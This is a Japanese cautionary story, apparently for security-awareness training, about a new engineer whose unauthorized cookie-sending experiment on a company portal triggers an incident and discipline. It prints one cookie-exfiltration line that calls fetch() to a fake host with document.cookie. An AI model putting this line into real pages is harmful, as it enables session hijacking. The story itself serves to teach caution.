⸻

🚨 事故ストーリー：「社内での無断実験」

登場人物
	•	ユウタ：新入エンジニア、好奇心旺盛でJavaScriptが大好き
	•	情報システム部（IS部）：社内システム管理とセキュリティ担当
	•	社内サービス：社員向けポータル、ログイン必須

⸻

1. 好奇心の実験

ユウタは、インターネットで見たコードを思い出した。

fetch('http://偽サイト/login?cookie=' + document.cookie )

「なるほど、これでクッキーが送れるのか！」
そう思い、社内ポータルで試すことにした。
彼はこう考えた：

「社内だし、自分しか使ってないから大丈夫だろう…」

⸻

2. 想定外の事態
	•	ユウタがコードを実行した瞬間、全社員のログインセッションが外部のサーバーに送信されてしまった。
	•	そのサーバーは実際には攻撃者が仕込んだものではなかったが、社内監査ログが異常を検知した。

⸻

3. セキュリティ部の対応
	•	IS部がログを調べると、特定の社員の端末から大量の不正アクセスのような通信が発生している。
	•	緊急でネットワークを遮断し、全社員のパスワード変更を指示。
	•	ユウタは自分の行為が原因だと気づく。

⸻

4. 会社からの処分
	•	IS部から事情聴取。
	•	「社内サイトで無断で外部通信を試みたこと」が重大なコンプライアンス違反とみなされる。
	•	結果：
	•	社内警告書を受け取る
	•	一部の権限が剥奪
	•	社内教育の受講を義務化

⸻

5. 教訓
	•	「社内だから安全」と思って実験した結果、全社員に影響が出た。
	•	一瞬の好奇心が、会社全体のセキュリティ事故につながることを痛感。
	•	安全な環境での実験と、必ず許可を取ることの重要性を学ぶことになった。

⸻

💡 ポイント：
	•	「社内サイトでの実験＝安全」ではない
	•	クッキーや認証情報を外部に送信するコードは、事故・違法・懲戒のリスクがある
	•	学ぶなら必ず 自分専用のローカル環境やテスト用環境 で行うこと
